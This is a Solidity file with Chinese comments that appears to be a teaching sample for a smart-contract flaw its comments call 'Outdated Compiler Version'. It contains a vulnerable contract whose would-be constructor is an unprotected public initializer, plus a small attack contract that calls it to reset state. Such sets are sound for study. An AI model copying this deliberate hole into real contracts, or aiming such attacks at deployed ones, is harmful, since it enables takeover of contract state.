// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
漏洞名稱：Outdated Compiler Version
描述：
  原本開發者使用舊版 Solidity (如 0.4.x) 時，可能會用與合約名稱相同的函式來實現建構子，
  但在 Solidity >=0.8.0 中，這種寫法已不被允許，必須使用 constructor 關鍵字。
  為了模擬這個漏洞，我們將原本打算作為建構子的函式稍作修改為 OutdatedCompilerVersion_()，
  讓它成為一個一般的 public 函式，攻擊者可以在部署後呼叫它重新初始化合約的狀態 (例如將狀態變數 x 重新設為 100)。

攻擊步驟：
  1. 部署 OutdatedCompilerVersion 合約，狀態變數 x 在部署時會被初始化為 1。
  2. 攻擊者呼叫 OutdatedCompilerVersion_() 函式，該函式會檢查是否已初始化，
     如果未初始化，則將 x 設為 100，並標記為已初始化，從而改變合約原有狀態。
*/

contract OutdatedCompilerVersion {
    // 狀態變數 x 原先被設為 1
    uint public x = 1;
    
    // 初始化旗標，用來確認是否已呼叫初始化函式
    bool public initialized = false;

    // 漏洞重點：本意應作為建構子使用，但使用錯誤命名 (在 Solidity >=0.8.0 中必須使用 constructor)
    // 攻擊者可利用此 public 函式重新初始化合約狀態
    function OutdatedCompilerVersion_() public {
        require(!initialized, "Already initialized");
        x = 100; // 攻擊者將 x 設為 100
        initialized = true;
    }
}

// 攻擊合約，用以示範如何利用上述漏洞重新初始化目標合約
contract AttackOutdatedCompilerVersion {
    function attack(address _vulnerableAddress) public {
        // 將目標地址轉型為 vulnerable 合約
        OutdatedCompilerVersion vulnerable = OutdatedCompilerVersion(_vulnerableAddress);
        // 呼叫錯誤命名的初始化函式，從而改變目標合約的狀態
        vulnerable.OutdatedCompilerVersion_();
    }
}
